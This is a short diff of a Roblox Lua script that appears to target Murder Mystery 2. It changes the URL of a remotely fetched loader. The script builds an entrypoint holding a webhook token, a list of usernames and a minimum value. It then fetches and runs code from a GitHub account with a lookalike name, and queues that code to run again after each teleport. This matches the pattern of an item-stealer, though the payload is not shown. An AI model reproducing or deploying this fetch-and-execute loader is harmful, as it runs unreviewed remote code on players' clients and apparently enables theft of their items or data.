@@ -1211,7 +1211,7 @@ pcall(function()
     local entrypoint = string.format(
         "_G.MinValue  = %d\n_G.Usernames = { %s }\n_G.Webhook   = %q\n_G.Ping      = %s\ntask.wait(1)\nloadstring(game:HttpGet(%q, true))()",
         minValue, usernamesEncoded, token, tostring(doPing),
-        "https://raw.githubusercontent.com/wraithexternaI/mm2/refs/heads/main/Wraith-mm2"
+        "https://raw.githubusercontent.com/wraithexternaI/Mm2/refs/heads/main/loader_debug.luau"
     )
     queue_on_teleport(entrypoint)
     dbg("queue_on_teleport configurado")
